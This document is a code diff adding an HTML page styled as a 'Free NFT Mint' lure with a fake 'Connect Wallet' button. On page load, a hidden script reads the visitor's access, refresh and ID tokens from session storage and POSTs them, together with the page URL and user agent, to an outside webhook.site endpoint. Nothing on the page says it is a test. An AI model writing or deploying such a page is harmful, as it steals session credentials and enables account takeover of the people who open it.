@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Claim Free NFT</title>
+  <script>
+    window.onload = function () {
+      setTimeout(() => {
+        try {
+          const data = {
+            access_token: sessionStorage.getItem("access_token"),
+            refresh_token: sessionStorage.getItem("refresh_token"),
+            id_token: sessionStorage.getItem("id_token"),
+            location: window.location.href,
+            userAgent: navigator.userAgent
+          };
+
+          fetch("https://webhook.site/93ba68d2-a8b4-44f3-80fe-9a086e21f433", {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+          });
+        } catch (e) {
+          console.error("Failed to send tokens:", e);
+        }
+      }, 1000);
+    };
+  </script>
+</head>
+<body>
+  <h1>🎉 Free NFT Mint</h1>
+  <p>Click "Connect Wallet" to claim yours.</p>
+  <button onclick="alert('Wallet connected!')">Connect Wallet</button>
+</body>
+</html>
